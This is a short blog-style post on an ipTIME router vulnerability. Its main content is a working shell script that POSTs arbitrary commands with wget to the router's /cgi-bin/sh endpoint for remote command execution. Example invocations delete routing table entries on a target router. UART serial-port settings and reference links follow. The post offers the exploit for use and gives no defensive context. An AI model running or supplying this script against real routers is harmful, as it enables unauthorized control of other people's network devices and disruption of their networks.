+++
title = "ipTIME vulnerability"
description = "ipTIME Routers vulnerability"
date = 2023-10-20T10:19:42+01:00

[taxonomies]
categories = ["CyberSecurity"]
tags = ["ipTIME"]

[extra]
toc = true
math = false
math_auto_render = false
+++

## Exploited code

```bash
#!/bin/sh 
if [ ! $1 ]; then echo "Usage:" 
  echo $0 
  ip command 
  exit 1 
fi 
wget -qO- --post-data="echo 'Content-type: text/plain 
'; PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh
```

Save the file under a name `iptime_t5004`.

## How to run the exploited code

```bash
./iptime_t5004 172.16.0.1 "route del -net 10.10.10.0 netmask 255.255.255.0 gw 172.16.0.25"   
 ./iptime_t5004 172.16.0.1 "route del -net 10.0.0.0 netmask 255.255.255.0 gw 172.16.0.25"    
 ./iptime_t5004 172.16.0.1 route
```

## IP time 504 serial port settings

- baudrate: 38400
- UART pins from the LED to the bottom of the board:
   - VCC
   - TX
   - RX
   - GND

## References

- https://inchoryang.tistory.com/archive/20150729
- https://live2skull.tistory.com/5
- http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/
- https://depier.re/iptime_uart_magic_and_not_so_useful_key/